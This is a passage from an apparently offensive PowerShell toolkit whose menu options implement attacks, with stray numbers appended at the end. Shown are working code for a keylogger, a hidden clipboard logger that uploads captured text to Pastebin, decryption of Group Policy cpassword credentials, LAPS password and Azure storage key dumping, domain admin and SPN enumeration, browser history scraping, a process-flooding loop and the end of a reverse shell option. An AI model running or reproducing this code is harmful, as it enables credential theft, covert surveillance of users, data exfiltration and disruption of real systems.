                    Write-Host " [*] Reverse Shell Is Running ..." -ForegroundColor Green

                    Write-Output ""

                                        } else {
                                        
                                            
                                            Write-Host " Reverse Shell Failed ..." -ForegroundColor Red
                                        
                                        
                                        
                                            }
    

    
    }


    
    


    
    
    } # End Of Option 12



    if ($option -eq "13"){
    
    
        
Write-Output ""

$userhandle = Read-Host -Prompt " [Username]:"

$myArray = @(
"https://twitter.com/$userhandle",
"https://www.instagram.com/$userhandle/",
"https://ws2.kik.com/user/$userhandle/",
"https://medium.com/@$userhandle",
"https://pastebin.com/u/$userhandle/",
"https://www.patreon.com/$userhandle/",
"https://photobucket.com/user/$userhandle/library",
"https://www.pinterest.com/$userhandle/",
"https://myspace.com/$userhandle/",
"https://www.reddit.com/user/$userhandle/"

)

Write-Output ""

Write-Host " [*] Running Checks ..."

Write-Output ""

    foreach ($i in $myArray) {

        try {

            $response = Invoke-WebRequest -Uri "$i" -UseBasicParsing -ErrorAction Stop
            $StatusCode = $Response.StatusCode

        } catch {

                $StatusCode = $_.Exception.Response.StatusCode.value__

                }


            if ($StatusCode -eq "200"){

                Write-Host "Found one: " -NoNewline ; Write-Host $i -ForegroundColor Green

                }

                    if ($StatusCode -eq "404"){

                    #Site Does Not Exist - Do Nothing

                    }

                    else {

                    #Do Nothing

                            }

    }

   Write-Output ""

    
    
    } # End Of Option 13



    if ($option -eq "14"){
    
     $flood = @(' 
 
          _.====.._
         ,:._       ~-_
             `\        ~-_
               | _\ \  |  `.
             ,/  / | |    ~-_
    -..__..-''   _ _ `_      ~~--..__...----... FLOOOODING ...

    ')


    Write-Host $flood -ForegroundColor Blue

    Start-Process powershell -ArgumentList 'while($true){$a = Get-Random; Invoke-Command -ArgumentList $a -ScriptBlock {$args[0]}}'
    
    
    
    } # End Of Option 14


    if ($option -eq "15"){
    
    
    
    Write-Output ""

    if (((Get-WmiObject Win32_ComputerSystem).Domain) -eq "WORKGROUP"){

    
        Write-Host " Requires Domain Joined Machine ..." -ForegroundColor Red
    
    } else {
    
    $xmls = @()
    $cpass = @()

    
    $dom = @((Get-DnsClientGlobalSetting).SuffixSearchList)

            foreach ($dmn in $dom){

                $fnd = @(Get-Childitem -Path \\$dmn\sysvol\$dmn\Policies -Recurse -force -ErrorAction SilentlyContinue -Include *.xml*)

                        foreach ($d in $fnd.Fullname){

                        $cp = Get-Content -Path $d | Select-String -Pattern "cpassword"

                            if ($cp -ne $null){

                                $xmls += $d

                                      }

                            }

            }



    foreach ($f in $xmls){

    $regex = ‘cpassword=".*\"’
    $a = select-string -Path $f -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value }
    $password = @($a.Split(" ")[0] -replace "cpassword=", "" -replace '"', "")
    $cpass += $password

    } 


    $count = 0

        foreach ($Cpassword in $cpass){

        Write-Output ""

        Write-Host "Password Found In: "
        Write-Host $xmls[$count] -ForegroundColor Green


            try {

          
              $Mod = ($Cpassword.length % 4)
            
             switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
        
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
        
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        Write-Output ""
        Write-Output "Password:"

        [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 
        
    catch {Write-Error $Error[0]} 

    
    $count++

    }


    
 
    
    }




    
    
    } # End Of Option 15


    if ($option -eq "16"){
    
    
     
    $wcrls = @()

    $cwlo = @('
    
        Crawler Options:

            1. Web Crawler
            2. File Crawler
    
    
    ')

     $cwlo

     $cwlc = Read-Host -Prompt " [Option]:"


    if ($cwlc -eq "1"){
    
    Write-Output ""

    Write-Host " [*] Prompting For URL ..."
 

    
    $url = Read-Host -Prompt " [URL]:"

        if ($url.EndsWith("/") -eq $false){
        
            $url = $url + "/"
            
            }


        if ($url.StartsWith("http") -eq $false){
        
            $url = "http://" + $url
            
            
            }
    
    Write-Output ""

    Write-Host " [*] Prompting For Wordlist To Crawl Site ..."
 
    $wordlist = @(Get-Content -Path (Read-Host -Prompt " [Location Of Wordlist]:"))

    Write-Output ""

    Write-Host " [*] Would You Like To See Fails? (Y/N) ..."

    $sf = Read-Host -Prompt " [Show Fails]:"
 
    Write-Output ""



        foreach ($i in $wordlist){

        $crawlurl = $url + $i
        $f = $false

        try{ 
        
            $crawl = Invoke-WebRequest $crawlurl -UseBasicParsing 
        
        
            }catch{

                $f = $true


                    if ($sf -eq "y"){
                    
                    
                        Write-Host "Failed: $crawlurl" -ForegroundColor Red
                        
                        
                            } else {
                            
                                # Do Nothing
                            
                                }
                                
                 }


        if ($crawl.statuscode -ne $null -and $f -eq $false){

            $code = $crawl.statuscode

            Write-Host "$crawlurl   :   Code: $code" -ForegroundColor Green

            $wcrls += $crawlurl

        } 
 
  } # Wordlist

  Write-Output ""

  Write-Host " [*] Paths Discovered ..." 

    foreach ($ss in $wcrls){
    
            Write-Host $ss -ForegroundColor Green

            }


 
} else {


    $filesfound = @()
    $wordsfound = @()
    $keywrdfound = @()

    Write-Output ""

     $cwlfo = @('
    
        Crawler Options:

            1. Crawl For File Names
            2. Crawl Using Keywords Within Content
    
    
    ')

    $cwlfo 


    $crlop = Read-Host -Prompt " [Option]:"

    if ($crlop -eq "1"){

    Write-Output ""

    Write-Host " [*] Prompting For File Name ..."

    $keywrd = Read-Host -Prompt " [Filename]:"

    $a= @(Get-ChildItem C:\ | Where-Object {$_.Name -ne "Windows" -and $_.Name -ne "Program Files" -and $_.Name -ne "Program Files (x86)"})

    Write-Output ""

    Write-Host " [*] Scanning ..."

    Write-Output ""

        foreach ($i in $a){
    
        
        $keysearch = Get-Childitem -Path $i.FullName -Recurse -force -ErrorAction SilentlyContinue -Include *$keywrd*

        $keywrdfound += $keysearch

        }

    Write-Output ""
    Write-Host " Files Found: " -NoNewline ; Write-Host $keywrdfound.Count -ForegroundColor Green

    Write-Output ""

        foreach ($kw in $keywrdfound){
        
            Write-Host $kw.FullName -ForegroundColor Green
                      
            }
    
    

    }



    if ($cwlc -eq "2"){

    $keywrd = Read-Host -Prompt " [Keyword]:"

    Write-Output ""


     $wtc = @('
    
        Where To Crawl:

            1. Targeted Directory
            2. Full Directory
    
    
    ')

    $wtc 

    $scan = Read-Host -Prompt " [Option]:"

    Write-Output ""

        if ($scan -eq "1"){
        
            $scn = Read-Host -Prompt " [Directory to crawl]:"
            
            } else{
        
                 $scn = "C:\"
        
                 }


    Write-Output ""

    Write-Host " [*] Searching for supported files ... (" -NoNewline ; Write-Host "log, txt, doc, docx, xlsx, xls, csv" -NoNewline -ForegroundColor Blue ; Write-Host ")"

    Write-Output ""

    $a= @(Get-ChildItem $scn | Where-Object {$_.Name -ne "Windows" -and $_.Name -ne "Program Files" -and $_.Name -ne "Program Files (x86)"})

        foreach ($i in $a){

            $formatsfound = @(Get-Childitem -Path $i.FullName -Recurse -force -ErrorAction SilentlyContinue -Include *.log, *.txt, *.docx, *.doc, *.xlsx, *.xls, *.csv)
            $filesfound += $formatsfound.Fullname

            }


                Foreach ($d in $filesfound){

                    if ($d -like "*.log" -or $d -like "*.txt"){

                    $lg = Get-Content -Path $d | Select-String -Pattern "$keywrd"

                        if ($lg -ne $null){

                            Write-Host " Found in: " -NoNewline ; Write-Host $d -ForegroundColor Green

                            }

                    } # End of Log Search


    # Find in Word docs

        if ($d -like "*.doc" -or $d -like "*.docx"){

        $word = New-Object -ComObject Word.Application
        $word.Visible = $false
        $wrd = $word.Documents.Open($d).Content.find.execute("$keywrd")

            if ($wrd -eq "True"){

                Write-Host " Found in: " -NoNewline ; Write-Host $d -ForegroundColor Green

                }


        $word.Quit()

        } # End of Word Search


# Find in Excel

    if ($d -like "*.csv" -or $d -like "*.xls" -or $d -like "*.xlsx"){

    $excl = New-Object -ComObject Excel.Application
    $excl.Visible = $false
    $workbook = $excl.Workbooks.Open($d)
    $worksheets = @($workBook.sheets)

        foreach ($sheet in $worksheets){

        $ex = $sheet.Cells.Find("$keywrd")

        }


            if ($ex -ne $null){

            Write-Host " Found in: " -NoNewline ; Write-Host $d -ForegroundColor Green

            }


        $workbook.close()
        $excl.quit()

          } # End of Excel search


        } # End of crawl


      }

     } 
 
    
    } # End Of Option 16
    


    if ($option -eq "17"){
    
    
# Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx

Write-Output ""

Write-Host " [*] Prompting For Output Location (TXT) ..."

$path = Read-Host -Prompt " [Location]:"

$tp = Test-Path $path -ErrorAction SilentlyContinue

    if ($tp -ne "True"){
    
        $path = "C:\temp\keylogger.txt"

        New-Item $path -Force -ErrorAction SilentlyContinue
        
        }

        Write-Output ""

    Write-Host " [*] Logging To $path ..."

    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
    Write-Output ""

    Write-Host " [*] Starting Logger ..."

    Write-Output ""


    try {
        
        while ((Test-Path $path) -ne $false){

           

            Start-Sleep -Milliseconds 40

            
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                
                $state = $API::GetAsyncKeyState($ascii)

                
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success -and (Test-Path $path) -eq $true) {
                       
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    } 

     finally {exit}
    
    
    
    
    
    } # End Of Option 17


    if ($option -eq "18"){
    
    

    Write-Output ""

     $clpo = @('
    
        Clippy Options:

            1. Upload To PasteBin
            2. Copy To File
    
    
    ')

    $clpo 
    
    $clpc = Read-Host -Prompt " [Option]:"


        
    if ($record -eq "p" -or $record -eq "P"){

    Write-Output " [*] PasteBin Selected ..."
    Write-Output " [*] Prompting For PasteBin Details ..."

    $pasteapikey = Read-Host -Prompt " [API Key]:"
    $pastename = Read-Host -Prompt " [Paste Name]:"

        if ($pastename -eq $null) {
        
        $pastename = "PSClippy"
        
        }

        Write-Host " [*] Creating Temp Files ..."

        $pasteapikey >> C:\temp\api.txt
        $pastename >> C:\temp\pastename.txt

        attrib +h "C:\temp\api.txt"
        attrib +h "C:\temp\pastename.txt"

        Write-Host " [*] Files Hidden ..."

    } else {

        $filechoice = 1

        Write-Host " [*] Prompting For Output File Location (TXT File Supported) ..."

        $fileloc = Read-Host -Prompt " [Location]:"

        Write-Output ""

            while ($fileloc.EndsWith(".txt") -eq $false){ 

            Write-Output ""

            Write-Host " Incorrect Value Entered ..." -ForegroundColor Red

            $fileloc = Read-Host -Prompt " [Location]:"

            }

            Write-Host " [*] Creating Temp Files ..."

            $fileloc >> C:\temp\file.txt
            attrib +h "C:\temp\file.txt"

            Write-Host " [*] Files Hidden ..."

        }

        Write-Output ""

 Write-Host " [*] Starting PSClippy ..."
 Write-Host " [*] Removing Temp Files ..."

 PowerShell.exe -windowstyle hidden {

 Write-Output ""

 

 $testfile = Test-Path -Path C:\temp\file.txt
 $testpaste = Test-Path -Path C:\temp\api.txt

    if ($testfile -eq "True"){

        $filechoice = 1
        $fileloc = Get-Content C:\temp\file.txt

        Remove-Item C:\temp\file.txt -Force

        

    }

    if ($testpaste -eq "True"){

    $pastechoice = 1
    $pasteapikey = Get-Content C:\temp\api.txt
    $pastename = Get-Content C:\temp\pastename.txt

    Remove-Item C:\temp\pastename.txt -Force
    Remove-Item C:\temp\api.txt -Force

    

    }



 $pclip = ""
 $array = @()
 $counter = 0



    while($true){

    # Get Clipboard

    $cclip = Get-Clipboard


        if ($pclip -eq $cclip){

        #Do Nothing
        
        } else {


        $array += $cclip
        $pclip = $cclip
        $cclip = Get-Clipboard


        $counter++

            if ($filechoice -eq 1){

            $pclip >> $fileloc

            }

        }

    if ($pastechoice -eq 1){


    # At 10, upload to PasteBin. You will need to add your API key *

        if ($counter -gt 9){


        # Format Paste

 $Body = @{    api_dev_key = ‘$pasteapikey’

    api_paste_code = (“$array”)

    api_paste_private = 0

    api_paste_name = ‘$pastename’

    api_option = ‘paste’

    api_user_key = ”"
 }

    # Upload To PasteBin
    Invoke-WebRequest -Uri “https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post


    $counter = 0

 }


} # End of if paste = 1


Start-Sleep -Seconds 5


} 


} # Hidden
    
    

    
    
    
    
    
    } # End Of Option 18


    if ($option -eq "19"){

    
    $i = (curl "http://ifconfig.me/ip" -UseBasicParsing).Content
    $ps = @(20,21,22,23,25,50,51,53,80,110,119,135,136,137,138,139,143,161,162,389,443,445,636,1025,1443,3389,5985,5986,8080,10000)
    $w = 80

    Write-Output ""


    Write-Host " Gateway: " -NoNewline ; Write-Host $i -ForegroundColor Green

    Write-Output ""

    Write-Host "  [*] Scanning ..."

    Write-Output ""

        foreach ($p in $ps){

        $t = new-Object system.Net.Sockets.TcpClient

         $r = $t.ConnectAsync($i,$p).Wait($w)

            if ($r -eq "True") {
      
             Write-Host "  Open Port: " -NoNewline ; Write-Host $p -ForegroundColor Green

            }

    }
    
    Write-Output ""
    
    
    
    } # End Of Option 19


    if ($option -eq "20"){

    Write-Output ""

    Write-Host " [*] Requires ActiveDirectory Module..... " -ForegroundColor Red
    
    $domains = @((Get-ADForest).domains)

        foreach ($domain in $domains){

            Write-Output ""

            Write-Host " Domain: $domain" -ForegroundColor Green

            Get-ADUser -Server $domain -Properties ServicePrincipalNames -Filter * | Where-Object {$_.ServicePrincipalNames -ne $null} | Select-Object UserPrincipalName, ServicePrincipalNames

            Write-Output ""


}

      
    
    
    } # End Of Option 20

    if ($option -eq "21"){

        Write-Output ""
        Write-Host "  [*] Sending Pulse ... "

        Get-NetNeighbor | Where-Object {$_.IpAddress -notlike "*::*" -and $_.state -eq "reachable"} | Format-Table IPAddress, LinkLayerAddress, State


    } # End Of Option 21


    if ($option -eq "22"){

        Write-Output ""
        Write-Host " [*] Finding Domain Admins ..."

        $lda = @((New-Object DirectoryServices.DirectorySearcher "ObjectClass=group").FindAll() | Where-Object {$_.path -like "LDAP://CN=Domain Admins*"})

        $da = $lda.path -replace "LDAP://",""

        $da = ((New-Object DirectoryServices.DirectorySearcher "(memberOf=$da)").FindAll())

        $tble = @()

            foreach ($usr in $da){

            $name = $usr.Properties.name
            $upn = $usr.Properties.userprincipalname 
            $sam = $usr.Properties.samaccountname 
            $desc= $usr.Properties.description 

            $t = New-Object -TypeName PSObject

            $t | Add-Member -MemberType NoteProperty -Name Name -Value $name
            $t | Add-Member -MemberType NoteProperty -Name Userprincipalname -Value $upn
            $t | Add-Member -MemberType NoteProperty -Name Samaccountname -Value $sam
            $t | Add-Member -MemberType NoteProperty -Name Description -Value $desc

            $tble += $t

            }

            $tble | Format-Table


            Write-Host " [*] Finding Domain Controllers ..."

            $tble = @()


            $ldc = @((New-Object DirectoryServices.DirectorySearcher "ObjectClass=Computer").FindAll() | Where-Object {$_.path -like "*Domain Controller*"}) 

             foreach ($dc in $ldc){

              $name = $dc.Properties.dnshostname
              [string]$ip = (Resolve-DnsName $name).IPAddress
              $os = $dc.Properties.operatingsystem 


             $t = New-Object -TypeName PSObject

              $t | Add-Member -MemberType NoteProperty -Name Name -Value $name
              $t | Add-Member -MemberType NoteProperty -Name OperatingSystem -Value $os
              $t | Add-Member -MemberType NoteProperty -Name IPAddress -Value $ip


             $tble += $t

              }


                $tble | Format-Table



   $qus = Read-Host -Prompt " [*] Look for more interesting objects? [Y/N]"

   if ($qus -eq "y"){

        Write-Output ""
        Write-Host " [*] Finding users of interest ..."
        Write-Output ""


        $lgi = @((New-Object DirectoryServices.DirectorySearcher "ObjectClass=group").FindAll() | Where-Object {$_.path -like "*sql*" -or $_.path -like "*admin*" -or $_.path -like "*critical*" -or $_.path -like "*security*"})

                foreach ($l in $lgi){

                $grp = $l.Properties.name

                 $tble = @()

                $gi = $l.path -replace "LDAP://",""

                  $gil = ((New-Object DirectoryServices.DirectorySearcher "(memberOf=$gi)").FindAll())
    
                    if ($gil.count -ne 0){

                    Write-Host "GroupName: $grp"
    
                        foreach ($g in $gil){
        
                         $name = $g.Properties.name
                         $upn = $g.Properties.userprincipalname 
                         $sam = $g.Properties.samaccountname 
                         $desc= $g.Properties.description 

                         $t = New-Object -TypeName PSObject

                         $t | Add-Member -MemberType NoteProperty -Name Name -Value $name
                         $t | Add-Member -MemberType NoteProperty -Name Userprincipalname -Value $upn
                         $t | Add-Member -MemberType NoteProperty -Name Samaccountname -Value $sam
                         $t | Add-Member -MemberType NoteProperty -Name Description -Value $desc

                         $tble += $t

                         
        
                       } 

        $tble | Format-Table
        start-sleep -Seconds 2 

        }


    }

        Write-Host " [*] Finding computers of interest ..."
        Write-Output ""

        $lgc = @((New-Object DirectoryServices.DirectorySearcher "ObjectClass=Computer").FindAll() | Where-Object {$_.path -like "*sql*" -or $_.path -like "*admin*" -or $_.path -like "*critical*" -or $_.path -like "*security*" -or $_.path -like "*XP*" -or $_.path -like "*legacy*" -or $_.path -like "*2003*"})

        $tble = @()

            foreach ($c in $lgc){

   

             $name = $c.Properties.dnshostname
             $ip = (Resolve-DnsName $name -ErrorAction SilentlyContinue).IPAddress
             $os = $c.Properties.operatingsystem 

            $t = New-Object -TypeName PSObject

              $t | Add-Member -MemberType NoteProperty -Name Name -Value $name
              $t | Add-Member -MemberType NoteProperty -Name OperatingSystem -Value $os
              $t | Add-Member -MemberType NoteProperty -Name IPAddress -Value $ip


              $tble += $t


              }

              $tble | Format-Table
    
}
        

    } # End Of Option 22


    if ($option -eq "23"){

        Write-Output ""
        $lcadm = (Get-CimInstance win32_useraccount | Where-Object {($_.sid).EndsWith("500")})
        $lcadmname = $lcadm.Name
        $lcadmen = $lcadm.Disabled

        Write-Host " [*] Local admin of this machine for reference: $lcadmname | isDisabled: $lcadmen"

        Write-Host " [*] Attempting to scrape LAPs passwords in AD ... "
        Start-Sleep -Seconds 2
        
        $fpss = @()
        try { $cmp = @(Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd); 
        
                                foreach ($c in $cmp){
        
                                 $tb = New-Object -TypeName PSObject;
                                 $tb | Add-Member -MemberType NoteProperty -Name Name -Value $c.DNSHostName
                                 $tb | Add-Member -MemberType NoteProperty -Name Password -Value ($c).'ms-Mcs-AdmPwd'
        
                                 if ($tb.Password -ne $null){ $fpss += $tb }
                                 
                                 }
                                 
                                 } catch { Write-Host " [*] Error: Workgroup or no AD Powershell Module ... "; Write-Output "" } Write-Output ""; $fpss
        
        
         

    } # End Of Option 23






# if ($option -eq "to copy"){}








             # ------------------------- Cloud Options -------------------------


# Azure AD



if ($option -eq "azad1"){


Get-AzureADTenantDetail | Select-Object DisplayName, ObjectId, TechnicalNotificationMails, TelePhoneNumber

(Get-AzureADTenantDetail).VerifiedDomains | Format-Table Name, Type


} # End Of AZAD1



if ($option -eq "azad2"){


$azroles = @(Get-AzureADDirectoryRole)

    foreach ($azr in $azroles){

        Write-Output ""

        Write-Host $azr.DisplayName -ForegroundColor Green

        Write-Output ""

        Get-AzureADDirectoryRoleMember -ObjectId $azr.ObjectId | Format-Table DisplayName, UserPrincipalName, Mail, Mobile, JobTitle
        
                 
        }   



    } # End Of AzAD2









# Azure Cloud


if ($option -eq "az1"){

Get-AzContext -ListAvailable

Write-Output ""

$subname = Read-Host -Prompt " Please Select A SubscriptionName:"

Set-AzContext -SubscriptionName $subname

Start-Sleep 3

Write-Output ""

Write-Host " [*] Microsoft Default Connection URLs are ..."

Write-Output ""

Write-Host " Blob storage: http://" -NoNewline ; Write-Host "mystorageaccount" -NoNewline -ForegroundColor Red; Write-Host ".blob.core.windows.net"
Write-Host " File storage: http://" -NoNewline ; Write-Host "mystorageaccount" -NoNewline -ForegroundColor Red; Write-Host ".file.core.windows.net"
Write-Host " Table storage: http://" -NoNewline ; Write-Host "mystorageaccount" -NoNewline -ForegroundColor Red; Write-Host ".Table.core.windows.net"
Write-Host " Queue storage: http://" -NoNewline ; Write-Host "mystorageaccount" -NoNewline -ForegroundColor Red; Write-Host ".queue.core.windows.net"

$sas = @(Get-AzStorageAccount)


Write-Output ""

Write-Host " [*] Starting Search ..."

Write-Output ""

    foreach ($sa in $sas){

    Write-Host " StorageAccountName: " -NoNewline;  Write-Host $sa.StorageAccountName -ForegroundColor Green
    Write-Host " ResourceGroupName: " -NoNewline;  Write-Host $sa.ResourceGroupName -ForegroundColor Green

    Get-AzStorageAccountKey -ResourceGroupName $sa.ResourceGroupName -StorageAccountName $sa.StorageAccountName | Format-Table -HideTableHeaders

    Write-Output ""

    }


} # End Of Az1

if ($option -eq "az2"){

 $azsubs = @((Get-AzSubscription).name) 
 $uaas = @()

 Write-Output ""

 Write-Host " [*] Running Through Subscriptions ... " -ForegroundColor Green

    foreach ($sub in $azsubs){
    
    Set-AzContext -SubscriptionName $sub


    $uaa = Get-AzRoleAssignment -RoleDefinitionName "User Access Administrator" -ErrorAction SilentlyContinue
    

        if ($uaa -ne $null){

        Write-Output ""
        Write-Host "[*] User Access Administrators Found:" -ForegroundColor Green

            foreach ($ua in $uaa){
              
              Write-Host $ua.SignInName
            
            }
        
        
        } else {
        
            Write-Host "[*] No User Access Administrators Found..." -ForegroundColor Red
        
            } 
        
        Write-Output "" 
                     

    }

    


} # End Of Az2





if ($option -eq "br-1"){
    Write-Host " [*] Running Histories "

    
    function showHistory {
        Param(
            [Parameter(HelpMessage='user:')]
            [Alias('u')]
            [string]$user,

            [Parameter(HelpMessage='browser:')]
            [Alias('b')]
            [string]$browser
        )

        $UserName = $env:USERNAME

        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History" 
            if (-not (Test-Path -Path $Path)) { 
                Write-Verbose "[!] Could not find Chrome History for username: $UserName" 
            } 

        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 

        $viewBrowser = ""
        switch ($browser) {
            "chrome" {$viewBrowser = "Google\Chrome"}
            "brave" {$viewBrowser = "BraveSoftware\Brave-Browser"}
            default {$viewBrowser = "Google\Chrome"}
        }

        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\$viewBrowser\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 

        $e = $Value | ForEach-Object { 
            $Key = $_ 
            if ($Key -match $Search){ 
                New-Object -TypeName PSObject -Property @{ 
                    User = $UserName 
                    Browser = $viewBrowser 
                    DataType = 'History' 
                    Data = $_ 
                } 
            } 
        } | Format-Table | Out-String | Write-Host

    }

    showHistory
}


  


    

} # End Of option while662133
4511674
9123965
9680243
6516501
5295207
1133725
8507704
7893036